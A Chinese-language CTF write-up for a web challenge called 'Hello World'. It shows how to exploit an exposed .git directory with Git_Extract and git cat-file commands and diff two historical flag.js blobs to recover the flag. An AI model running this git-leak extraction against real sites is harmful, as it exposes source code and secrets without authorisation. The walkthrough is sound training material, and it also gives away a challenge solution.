# Hello World

> 分类：Web

## 题目描述

打开只有 `Hello, World!`，源代码引用了不存在的 `flag.xmas.js`，但存在 git 泄露（`.git` 目录），flag 藏在历史提交的两个不同版本 `flag.js` 的差异中。

## 考察知识点

- git 泄露
- git 底层命令（cat-file / ls-tree）
- 对比历史版本文件差异

## 解法

1. **发现 git 泄露**：扫描发现 `/.git/` 目录存在。

2. **提取 git 信息**：用 GitHacker/Git_Extract 提取，但普通 githack 会遗漏部分 object（考点在 `.git/logs/HEAD` 的利用）。

3. **手工提取 object**（用 git 底层命令）：

```bash
git cat-file -p 887746652d1084c47682b6e1b46bbc37c9315663  # finish commit
git cat-file -p 09e053a355059e89b4367024578c477e022ac6d6    # "the dev branch is for developing" commit

git cat-file -p b5dfb5846ad5a81ebf6104d5230728cbf48d653b
# tree 包含 flag.js / flag.php / index.php

git cat-file -p 9ee4dcc90211b7c2dc3e5639a0296aecb730b48c
# tree 同样包含 flag.js / flag.php / index.php（但 flag.js 的 hash 不同）
```

4. **发现 flag.js 有两个不同 hash**：

```
b5dfb5846ad5a81ebf6104d5230728cbf48d653b → flag.js = f2b45f1e5af6dc1a8607c11e4ddc5fd077276c45
9ee4dcc90211b7c2dc3e5639a0296aecb730b48c → flag.js = 04bb09bb63fe48e6cab3e1c72a7ef51dda9634b8
```

5. **下载并对比两个文件**：

```bash
git cat-file blob f2b45f1e5af6dc1a8607c11e4ddc5fd077276c45 > f2b45f1.js
git cat-file blob 04bb09bb63fe48e6cab3e1c72a7ef51dda9634b8 > 04bb09b.js
```

对比发现改变（删除/修改）的字符就是 flag，拼接提交。

**TIPS**：用 `Git_Extract` 工具可直接提取到两个 js 文件。

```bash
python git_extract.py http://target/.git/
```

## 参考答案

（flag 通过对比两个历史版本 flag.js 的差异拼接得到）

## 来源

- 作者：AlexANSO | https://www.cnblogs.com/R-S-PY/p/12759115.html
- 作者：Xhy | https://blog.xhyeax.com/2019/01/26/icq-2nd-happy-rec/
